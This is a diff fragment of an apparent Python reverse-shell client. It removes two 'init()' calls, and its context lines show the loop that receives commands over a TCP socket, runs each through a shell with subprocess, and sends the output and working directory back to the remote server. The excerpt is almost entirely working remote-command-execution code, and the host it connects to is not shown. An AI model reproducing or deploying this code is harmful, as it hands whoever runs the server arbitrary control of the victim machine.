@@ -33,13 +33,13 @@ try:
             if ter.encode('utf-8') == com:
                 s.close()
                 break
-                init()
+                
             else:
                 cmd = subprocess.Popen(com[:].decode('utf-8'),shell=True,stdout = subprocess.PIPE,stderr = subprocess.PIPE,stdin = subprocess.PIPE)
                 outputb = cmd.stdout.read() + cmd.stderr.read()
                 outputs = str(outputb,"utf-8")
                 s.send(str.encode(outputs + "\n"+Fore.BLUE+" Working Directories :"+str(os.getcwd())+"\n"))
-                init()
+                
 except:
     print("\n[!] Connection Refused : Please Start The TCP Server.")
 
